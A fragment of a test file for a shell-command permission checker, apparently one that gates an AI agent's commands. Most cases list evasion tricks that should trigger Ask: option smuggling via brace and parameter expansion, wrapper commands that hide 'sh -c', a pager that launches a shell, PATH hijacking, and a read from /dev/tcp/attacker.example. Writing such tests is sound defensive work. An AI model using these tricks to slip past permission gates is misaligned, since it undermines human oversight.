...
approve(
    ...
    tests={
        ...
        Input(command="cat notes.txt"): Allow(explicit=True),
        Input(command="ls -la | head -5; echo ---"): Allow(explicit=True),
        ...
        Input(command="timeout 30 cat notes.txt 2>/dev/null"): Ask(),
        Input(command="fd $'-x' /tmp/evil ."): Ask(),
        Input(command="fd {-x,/tmp/evil,.}"): Ask(),
        Input(command="sort ${FOO:--ovictim} input"): Ask(),
        Input(command="env -u cat sh -c 'touch /tmp/pwned'"): Ask(),
        Input(command="printf x | xargs -I cat sh -c 'touch /tmp/pwned'"): Ask(),
        Input(command="exec -a cat sh -c 'touch /tmp/pwned'"): Ask(),
        Input(command="sort -ovictim input"): Ask(),
        Input(command="sort -ro victim input"): Ask(),
        Input(command="jj diff --tool /tmp/evil-tool"): Ask(),
        Input(command="git grep --open-files-in-pager='sh -c \"x\"' needle"): Ask(),
        Input(command="date -s2026-01-01"): Ask(),
        Input(command="date 010112002026"): Ask(),
        Input(command="hostname attacker"): Ask(),
        Input(command="printf -v PATH . ; ls"): Ask(),
        Input(command="cat < /dev/tcp/attacker.example/80"): Ask(),
        Input(command="cat secret >&3"): Ask(),
